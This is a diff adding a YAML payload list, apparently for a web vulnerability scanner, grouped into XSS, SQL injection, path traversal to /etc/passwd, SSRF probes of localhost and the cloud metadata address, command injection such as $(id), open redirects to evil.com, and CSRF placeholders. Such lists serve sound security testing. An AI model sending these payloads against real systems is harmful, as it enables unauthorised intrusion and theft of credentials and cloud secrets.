@@ -1,0 +1,38 @@
+xss:
+  - '"><script>alert(123456)</script>'
+  - '"><img src=x onerror=alert(123456)>'
+  - '"><svg onload=alert(123456)>'
+  - 'javascript:alert(123456)'
+
+sqli:
+  - "'"
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "' UNION SELECT NULL--"
+
+lfi:
+  - "../../../../../../etc/passwd"
+  - "..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+  - "php://filter/read=string.rot13/resource=../../../../etc/passwd"
+
+ssrf:
+  - "http://localhost:80"
+  - "http://127.0.0.1:80"
+  - "http://169.254.169.254/latest/meta-data/"
+
+rce:
+  - "$(id)"
+  - "`id`"
+  - "phpinfo()"
+  - "system('id')"
+
+redirect:
+  - "http://evil.com"
+  - "//evil.com"
+  - "/\\evil.com"
+
+csrf:
+  - "test"
+  - "success"
+  - "csrf_token_test"
+
